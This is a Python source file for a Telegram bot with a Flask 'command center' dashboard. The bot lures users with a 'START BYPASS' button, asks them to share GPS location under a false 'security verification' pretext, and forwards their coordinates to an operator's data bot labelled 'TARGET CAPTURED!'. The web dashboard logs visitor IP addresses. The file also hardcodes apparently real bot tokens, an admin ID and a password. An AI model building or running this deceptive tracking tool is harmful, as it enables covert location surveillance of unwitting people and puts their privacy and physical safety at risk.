import telebot
from telebot import types
from flask import Flask, request, render_template_string, redirect, session, url_for
import threading
import os
import signal
from datetime import datetime

MAIN_BOT_TOKEN = '8756220877:AAGKKlYU8MDptXx2b5-EvCG_hwgRREhDfQk' 
DATA_BOT_TOKEN = '8341378125:AAEBZUoGu6tQK6TfrK6T104Iw35KjRYAkjU'
ADMIN_ID = 6393437351 
OWNER_USERNAME = "@KING_OF_ENAFUL" 
SERVER_PASSWORD = "CYBER 71ENAFUL" 
SERVER_URL = "https://predictions-together-baths-kind.trycloudflare.com" 

bot = telebot.TeleBot(MAIN_BOT_TOKEN)
data_bot = telebot.TeleBot(DATA_BOT_TOKEN)
app = Flask(__name__)
app.secret_key = "enaful_v6_final_fix_secure"

CHAT_ID_DB = "OWNER_ENAFUL_database.txt"
IP_LOG_DB = "IP_LOGS.txt"

for db in [CHAT_ID_DB, IP_LOG_DB]:
    if not os.path.exists(db):
        with open(db, 'w') as f: f.write("")

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>ENAFUL V6 - COMMAND CENTER</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; margin: 0; padding: 10px; }
        .header { border: 2px solid #0f0; padding: 10px; box-shadow: 0 0 15px #0f0; margin-bottom: 20px; }
        .card { border: 1px solid #0f0; padding: 10px; background: #050505; text-align: left; margin-bottom:10px; }
        .logs { height: 160px; overflow-y: auto; border-top: 1px dashed #0f0; margin-top: 5px; padding-top: 5px; font-size: 11px; color: #00ffcc; line-height: 1.4; }
        .btn-group { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 10px; }
        .btn { padding: 12px; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 11px; transition: 0.3s; }
        .btn:active { transform: scale(0.95); }
        .btn-owner { background: #ff00ff; color: #fff; grid-column: span 2; font-size: 14px; border: 1px solid #fff; }
        .btn-sync { background: #00ff00; color: #000; }
        .btn-link { background: #00ffff; color: #000; }
        .btn-clear { background: #ffaa00; color: #000; }
        .btn-kill { background: #ff0000; color: #fff; }
        h2 { font-size: 13px; color: #fff; border-bottom: 1px solid #0f0; display: inline-block; margin: 5px 0; }
    </style>
</head>
<body>
    <div class="header"><h1>☢ ENAFUL COMMAND V6 ☢</h1></div>
    
    <button class="btn btn-owner" onclick="window.open('https://t.me/{{ owner_user }}', '_blank')">👤 OWNER: ENAFUL (CONTACT)</button>

    <div class="card" style="margin-top:10px;">
        <h2>🖥️ STATUS: SYSTEM ONLINE ✅</h2>
        <p style="font-size: 9px; color: #888;">Resource Monitor Disabled for Termux Compatibility.</p>
    </div>

    <div class="card">
        <h2>🌐 LOGS TRACKER (IP & GPS)</h2>
        <div class="logs">
            <b>[IP VISITORS]</b><br>{{ ip_logs|safe }}<hr style="border: 0.5px dashed #0f0;">
            <b>[GPS TARGETS]</b><br>{{ chat_ids|safe }}
        </div>
    </div>

    <div class="btn-group">
        <button class="btn btn-sync" onclick="location.reload()">🔄 SYNC DATA</button>
        <button class="btn btn-link" onclick="location.href='/get_link'">🔗 GET BOT LINK</button>
        <button class="btn btn-clear" onclick="if(confirm('Clear All Logs?')){location.href='/clear'}">🧹 CLEAN DB</button>
        <button class="btn btn-kill" onclick="if(confirm('Shutdown Server?')){location.href='/kill'}">🛑 KILL NODE</button>
    </div>
</body>
</html>
"""


@app.route('/', methods=['GET', 'POST'])
def login():
    ip = request.remote_addr
    with open(IP_LOG_DB, "a") as f:
        f.write(f"[{datetime.now().strftime('%H:%M')}] IP: {ip}\n")
    
    if request.method == 'POST':
        if request.form.get('password') == SERVER_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
    return render_template_string('<body style="background:#000;color:#0f0;text-align:center;padding-top:100px;font-family:monospace;"><h2>☣ LOGIN REQUIRED ☣</h2><form method="POST"><input type="password" name="password" placeholder="KEY" style="background:#000;border:1px solid #0f0;color:#0f0;padding:12px;text-align:center;"><br><br><button type="submit" style="background:#0f0;padding:10px 25px;font-weight:bold;cursor:pointer;">AUTHORIZE</button></form></body>')

@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'): return redirect(url_for('login'))
    
    with open(CHAT_ID_DB, "r") as f: t_logs = f.read().replace('\n', '<br>')
    with open(IP_LOG_DB, "r") as f: i_logs = f.read().replace('\n', '<br>')
        
    return render_template_string(DASHBOARD_HTML, chat_ids=t_logs, ip_logs=i_logs, owner_user=OWNER_USERNAME.replace('@',''))

@app.route('/get_link')
def get_link():
    if session.get('logged_in'):
        msg = f"🛰 **ENAFUL V6 COMMAND**\n🔗 Live Link: `{SERVER_URL}`"
        data_bot.send_message(ADMIN_ID, msg)
        return "<script>alert('Link Sent to Data Bot!'); window.location.href='/dashboard';</script>"
    return redirect(url_for('login'))

@app.route('/clear')
def clear():
    if session.get('logged_in'):
        open(CHAT_ID_DB, 'w').close()
        open(IP_LOG_DB, 'w').close()
        data_bot.send_message(ADMIN_ID, "🧹 **DB CLEANED BY ADMIN**")
    return redirect(url_for('dashboard'))

@app.route('/kill')
def kill():
    if session.get('logged_in'):
        data_bot.send_message(ADMIN_ID, "🛑 **SERVER TERMINATED**")
        os.kill(os.getpid(), signal.SIGINT)
    return "SERVER OFFLINE"


@bot.message_handler(commands=['start'])
def welcome(message):
    uname = message.from_user.first_name
    welcome_text = (
        f"```\n"
        f"  🌐 SYSTEM: OWNER ENAFUL v6.0\n"
        f"  ──────────────────────────\n"
        f"  [🔓] ACCESS: AUTHORIZED\n"
        f"  [🛰️] TRACKING: INITIALIZED\n"
        f"  ──────────────────────────\n"
        f"```\n"
        f"👋 **GREETINGS, AGENT {uname.upper()}!**\n\n"
        f"🛡️ **STATUS:** `CONNECTED` ✅\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"সিস্টেম এক্সেস করতে নিচের বাটনে ক্লিক করুন।"
    )
    
    markup = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("🔓 START BYPASS", callback_data="ask_location")
    btn2 = types.InlineKeyboardButton("🖥 COMMAND CENTER", url=SERVER_URL)
    markup.add(btn1, btn2)
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "ask_location")
def ask_location(call):
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton(text="📍 VERIFY GPS", request_location=True))
    bot.send_message(call.message.chat.id, "🎯 **SECURITY:** ভেরিফাই করতে লোকেশন শেয়ার করুন।", reply_markup=markup)

@bot.message_handler(content_types=['location'])
def handle_location(message):
    if message.location:
        lat, lon = message.location.latitude, message.location.longitude
        log = f"[{datetime.now().strftime('%H:%M')}] {message.from_user.first_name}: {lat},{lon}"
        with open(CHAT_ID_DB, "a") as f: f.write(log + "\n")
        
        map_url = f"https://www.google.com/maps?q={lat},{lon}"
        report = f"🏴‍☠️ **TARGET CAPTURED!**\n👤 Name: {message.from_user.first_name}\n📍 Coords: `{lat},{lon}`\n🔗 [MAP LINK]({map_url})"
        data_bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
        
        bot.send_message(message.chat.id, "✅ **ACCESS GRANTED.**", reply_markup=types.ReplyKeyboardRemove())


if __name__ == '__main__':
    print(">>> ENAFUL V6 STARTED ON PORT 5000")
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000)).start()
    bot.infinity_polling()
